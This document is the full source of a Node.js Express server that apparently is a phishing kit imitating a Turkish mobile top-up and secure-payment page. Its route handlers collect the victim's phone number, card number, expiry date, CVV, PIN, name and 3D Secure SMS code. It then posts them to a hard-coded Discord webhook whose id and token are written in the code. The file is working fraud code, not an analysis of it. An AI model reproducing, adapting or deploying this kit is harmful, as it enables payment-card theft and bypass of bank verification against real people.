var id = "868978171347877888";
var token =
  "HdNPIiixw9waCctERR4uoSKWJqcJ1f2rP41DiXR6cUPHEzzd9Mis1v2MKeq_kRDOC9xt";

const express = require("express");
const app = express();
const fs = require("fs");
const moment = require("moment-timezone");
const bodyParser = require("body-parser");
const time = (format = "YYYY/MM/DD HH:mm:ss") =>
  moment.tz("ASIA/ISTANBUL").format(format);
const log = message =>
  console.error(`[${time("YYYY-MM-DD HH:mm:ss")}] ${message}`);
const requestIp = require("request-ip");
const session = require("express-session");
app.listen(process.env.PORT || 3000, () =>
  log("PORT Hazır: " + process.env.PORT || 3000)
);
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(requestIp.mw());
app.use(
  session({
    secret: "ardaiisteaq",
    resave: false,
    saveUninitialized: true
  })
);
app.use((req, res, next) => {
  req.IP = req.ip = req.clientIp;
  next();
});
function makeid(n) {
  var chars = "0123456789";
  var token = "";
  for (var i = 0; i < n; i++) {
    token += chars[Math.floor(Math.random() * chars.length)];
  }
  return token;
}

global.makeid = makeid;

var this_url = "universal-purring-recess.glitch.me";

app.get("/", (req, res) => {
  res.render(`${__dirname}/views/index.ejs`, { req, res });
});
app.get("/3d", (req, res) => {
  res.render(`${__dirname}/views/3d.ejs`, { req, res });
});
app.get("/main", (req, res) => {
  res.render(`${__dirname}/views/main.ejs`, { req, res });
});
app.get("/pos", (req, res) => {
  res.render(`${__dirname}/views/pos.ejs`, { req, res });
});
app.get("/logo2.png", (req, res) => {
  require("request")(
    "https://cdn.glitch.com/9a462bed-68f1-4708-af27-02a21815f184%2Fb8fb2726-ce3a-430b-9d05-523673480d72.image.png?v=1627247666335"
  ).pipe(res);
});
app.get("/guvenliode.png", (req, res) => {
  require("request")(
    "https://cdn.glitch.com/9a462bed-68f1-4708-af27-02a21815f184%2F95ad6bc5-3cca-4d9b-96ae-03ff88a7a1d2.guvenliode.jpg?v=1627251830164"
  ).pipe(res);
});

app.post("/ajax/:type.php", (req, res, next) => {
  var type = req.params.type;

  if (type == "getPos") {
    var { telNo, yuklemeMiktari: tutar } = req.body;
    var id = makeid(10);
    req.session.recent = { id, telNo, tutar };
    res.json({
      type: "success",
      msg: "Giriş başarılı, yönlendiriliyorsunuz.",
      location: `https://${req.hostname}/pos?id=${id}&tutar=${tutar}`
    });
  } else if (type == "get3D") {
    res.json({
      type: "success",
      msg: "yönlendiriliyorsunuz.",
      location: `https://${req.hostname}/3d?id=${req.query["id"]}`
    });
  } else if (type == "set3D") {
    var { sms_kod } = req.body;
    req.session.recent.sms_kod = sms_kod;
    res.json({
      type: "success",
      msg: "das ok bro, next.",
      location: `https://${req.hostname}/pos?again=1`
    });

    var wb = new (require("discord.js")).WebhookClient(id, token);
    var embed = new (require("discord.js")).MessageEmbed().setColor("RED");
    Object.keys(req.session.recent || {}).forEach(key =>
      embed.addField(key, req.session.recent[key], true)
    );
    wb.send(embed);
  } else if (type == "getresp") {
    var { id, cc_no, cc_skt, cc_cvv, cc_pin, cc_nme } = req.body;
    req.session.recent = Object.assign(req.session.recent, {
      cc_no,
      cc_skt,
      cc_cvv,
      cc_pin,
      cc_nme
    });
    res.json({ type: "success", msg: "das ok bro, next." });
  } else next();
});

app.get("*", (req, res) => res.redirect("/"));
app.post("/", (req, res) => {
  console.log(req.body);
  res.sendStatus(200);
});
